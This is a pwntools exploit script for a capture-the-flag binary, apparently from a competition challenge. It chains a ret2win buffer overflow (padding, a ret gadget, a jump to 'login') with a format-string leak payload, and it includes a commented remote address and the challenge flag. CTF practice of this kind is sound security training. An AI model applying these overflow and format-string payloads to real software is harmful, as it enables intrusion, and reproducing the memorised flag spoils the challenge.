#!/usr/bin/env python3
from pwn import *

elf = ELF('./format2win')
rop = ROP(elf)

p = elf.process()
# p = remote('18.143.17.69', 9001)

def exploit():

    padding = b'A'*88
    ret = (rop.find_gadget(['ret']))[0] # Stack Alignment
    vuln = elf.symbols['login'] # ret2win

    payload = padding
    payload += p64(ret)
    payload += p64(vuln)

    p.recvuntil(b'[!] ')
    log.info(p.recvuntil(b'?').decode(encoding='ascii'))
    p.recvuntil(b'> ')

    log.success(f'Jumping to vuln function with payload: {payload}')
    p.sendline(payload)

    p.recvuntil(b'[*] ')
    log.info(p.recvuntil(b'!').decode(encoding='ascii'))

    # Format String Vulnerability
    payload = (b"%14$p %15$p %16$p %17$p %18$p %19$p")
    log.success(f'Leaking address with payload: {payload}')
    p.sendline(payload)

    p.recvuntil(b': ')

    leak = p.recvline()
    leak = leak[:-1]
    log.warn(f'Leaked Data: {leak}')

    # Convert address to little endian and ASCII characters
    # flag = "APUBOH22{134klng_d4t4_with_f0rm4t_sp3cifi3r}"
    # log.indented(f'Flag: {flag}')

def main():
    exploit()

if __name__ == "__main__":
    main()
